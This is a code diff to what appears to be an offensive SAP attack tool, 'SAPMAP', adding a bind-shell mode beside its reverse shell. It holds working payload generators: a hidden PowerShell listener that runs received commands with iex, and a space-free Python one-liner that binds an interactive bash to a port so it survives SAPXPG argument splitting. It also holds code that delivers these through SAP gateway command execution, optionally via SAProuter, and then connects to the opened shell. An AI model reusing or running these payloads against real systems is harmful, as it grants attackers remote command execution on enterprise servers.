@@ -206,25 +206,27 @@ _shell_lock = threading.Lock()
 class ShellSession:
     """Manages a single reverse shell TCP connection."""
 
-    def __init__(self, listen_port: int, target_sid: str):
-        self.listen_port = listen_port
+    def __init__(self, port: int, target_sid: str, mode: str = "reverse"):
+        self.port = port
         self.target_sid = target_sid
+        self.mode = mode           # "reverse" or "bind"
         self.status = "idle"       # idle/waiting/connected/disconnected/error
         self.error_msg = ""
         self.server_sock = None
         self.client_sock = None
         self.client_addr = None
+        self.target_host = ""      # for bind mode: target IP to connect to
         self.output_buffer = []
         self.output_lock = threading.Lock()
 
     def start_listener(self):
-        """Bind TCP listener and wait for connection in background."""
+        """Bind TCP listener and wait for reverse shell connection."""
         try:
             self.server_sock = _socket_mod.socket(
                 _socket_mod.AF_INET, _socket_mod.SOCK_STREAM)
             self.server_sock.setsockopt(
                 _socket_mod.SOL_SOCKET, _socket_mod.SO_REUSEADDR, 1)
-            self.server_sock.bind(("0.0.0.0", self.listen_port))
+            self.server_sock.bind(("0.0.0.0", self.port))
             self.server_sock.listen(1)
             self.status = "waiting"
             threading.Thread(target=self._listener_loop, daemon=True).start()
@@ -248,6 +250,45 @@ class ShellSession:
             self.status = "error"
             self.error_msg = str(e)
             self._close_server()
+
+    def start_connector(self, target_host: str, saprouter: str = ""):
+        """Connect TO a bind shell on the target (bind mode)."""
+        self.target_host = target_host
+        self.status = "waiting"
+        threading.Thread(
+            target=self._connector_loop,
+            args=(target_host, saprouter),
+            daemon=True).start()
+
+    def _connector_loop(self, target_host, saprouter):
+        """Try to connect to the bind shell with retries."""
+        import time
+        for attempt in range(30):  # retry for 30 seconds
+            if self.status != "waiting":
+                return
+            try:
+                if saprouter:
+                    from sap_saprouter import (connect_through_saprouter,
+                                               build_route_for_port)
+                    route = build_route_for_port(
+                        saprouter, target_host, self.port)
+                    self.client_sock = connect_through_saprouter(
+                        route, timeout=5)
+                else:
+                    self.client_sock = _socket_mod.socket(
+                        _socket_mod.AF_INET, _socket_mod.SOCK_STREAM)
+                    self.client_sock.settimeout(5)
+                    self.client_sock.connect((target_host, self.port))
+                self.client_addr = (target_host, self.port)
+                self.status = "connected"
+                threading.Thread(
+                    target=self._reader_loop, daemon=True).start()
+                return
+            except Exception:
+                time.sleep(1)
+        self.status = "error"
+        self.error_msg = (f"Could not connect to bind shell at "
+                          f"{target_host}:{self.port} after 30 attempts")
 
     def _reader_loop(self):
         try:
@@ -357,6 +398,47 @@ def _generate_payload(os_type: str, ip: str, port: int) -> dict:
             "command": "python3",
             "params": f"-c {py_code}",
             "display": f"Python3 reverse shell → {ip}:{port}",
+        }
+
+
+def _generate_bind_payload(os_type: str, port: int) -> dict:
+    """Generate bind shell payload — opens a listening port on the target."""
+    is_win = any(w in (os_type or "").lower() for w in ("windows", "nt", "win"))
+    if is_win:
+        ps = (f"$l=New-Object Net.Sockets.TcpListener([Net.IPAddress]::Any,{port});"
+              f"$l.Start();"
+              f"$c=$l.AcceptTcpClient();"
+              f"$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};"
+              f"while(($i=$s.Read($b,0,$b.Length))-ne 0){{"
+              f"$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);"
+              f"$r=(iex $d 2>&1|Out-String);"
+              f"$p=$r+'PS '+$(pwd).Path+'> ';"
+              f"$t=([text.encoding]::ASCII).GetBytes($p);"
+              f"$s.Write($t,0,$t.Length);$s.Flush()}};$c.Close();$l.Stop()")
+        return {
+            "command": "cmd.exe",
+            "params": f"/C powershell -nop -w hidden -c \"{ps}\"",
+            "display": f"PowerShell bind shell on target port {port}",
+        }
+    else:
+        # Bind shell: listen on target, SAPMAP connects to it.
+        # Zero spaces in code (SAPXPG splits at spaces).
+        py_code = (
+            f"s=__import__('socket').socket(2,1);"
+            f"s.setsockopt(1,2,1);"
+            f"s.bind(('0.0.0.0',{port}));"
+            f"s.listen(1);"
+            f"c,a=s.accept();"
+            f"__import__('os').dup2(c.fileno(),0);"
+            f"__import__('os').dup2(c.fileno(),1);"
+            f"__import__('os').dup2(c.fileno(),2);"
+            f"__import__('subprocess').call(['/bin/bash','-i'])"
+        )
+        assert " " not in py_code, f"Space in bind payload: {py_code}"
+        return {
+            "command": "python3",
+            "params": f"-c {py_code}",
+            "display": f"Python3 bind shell on target port {port}",
         }
 
 
@@ -1228,7 +1310,8 @@ def create_app(api: SAPMAPApi) -> Bottle:
         data = request.json or {}
         sid = data.get("sid", "")
         method = data.get("method", "gateway")
-        listen_port = int(data.get("listen_port", 4444))
+        shell_mode = data.get("shell_mode", "reverse")  # "reverse" or "bind"
+        shell_port = int(data.get("listen_port", 4444))
         local_ip = data.get("local_ip", "127.0.0.1")
 
         node = api.state.get_node(sid)
@@ -1239,18 +1322,30 @@ def create_app(api: SAPMAPApi) -> Bottle:
             if _shell_session and _shell_session.status in ("waiting", "connected"):
                 return json.dumps({"error": "A shell session is already active. "
                                              "Stop it first."})
-            session = ShellSession(listen_port, sid)
-            session.start_listener()
-            if session.status == "error":
-                return json.dumps({"error": session.error_msg})
+            session = ShellSession(shell_port, sid, mode=shell_mode)
+            if shell_mode == "reverse":
+                session.start_listener()
+                if session.status == "error":
+                    return json.dumps({"error": session.error_msg})
+            else:
+                # Bind mode: just set waiting, connector starts after payload
+                session.status = "waiting"
             _shell_session = session
 
         # Generate and send payload in background
         def _send():
-            payload = _generate_payload(node.os_type, local_ip, listen_port)
-            print(f"[*] {sid}: Sending reverse shell payload: "
-                  f"{payload['display']}")
-            print(f"    Listening on 0.0.0.0:{listen_port}")
+            target_host = node.ip or node.hostname
+            if shell_mode == "bind":
+                payload = _generate_bind_payload(node.os_type, shell_port)
+                print(f"[*] {sid}: Sending bind shell payload: "
+                      f"{payload['display']}")
+                print(f"    Will connect to {target_host}:{shell_port} "
+                      f"after payload delivery")
+            else:
+                payload = _generate_payload(node.os_type, local_ip, shell_port)
+                print(f"[*] {sid}: Sending reverse shell payload: "
+                      f"{payload['display']}")
+                print(f"    Listening on 0.0.0.0:{shell_port}")
 
             if method == "gateway":
                 result = sapmap_exploit.execute_gw_command(
@@ -1264,10 +1359,20 @@ def create_app(api: SAPMAPApi) -> Bottle:
                     node, payload["command"], payload["params"], creds)
 
             if result.get("success"):
-                print(f"[+] {sid}: Reverse shell payload delivered")
+                print(f"[+] {sid}: Shell payload delivered")
                 if result.get("output"):
                     for line in result["output"][:5]:
                         print(f"    {line}")
+                # For bind mode: start connecting to the target
+                if shell_mode == "bind":
+                    import time
+                    time.sleep(2)  # give the bind shell time to start
+                    with _shell_lock:
+                        if _shell_session and _shell_session.status == "waiting":
+                            print(f"[*] {sid}: Connecting to bind shell "
+                                  f"at {target_host}:{shell_port}...")
+                            _shell_session.start_connector(
+                                target_host, node.saprouter)
             else:
                 err = result.get("error", "unknown")
                 print(f"[-] {sid}: Payload delivery failed: {err}")
@@ -1276,7 +1381,8 @@ def create_app(api: SAPMAPApi) -> Bottle:
                         _shell_session.error_msg = f"Payload failed: {err}"
 
         threading.Thread(target=_send, daemon=True).start()
-        return json.dumps({"status": "ok", "port": listen_port})
+        return json.dumps({"status": "ok", "port": shell_port,
+                           "mode": shell_mode})
 
     @app.route("/api/shell/status", method="GET")
     def shell_status():
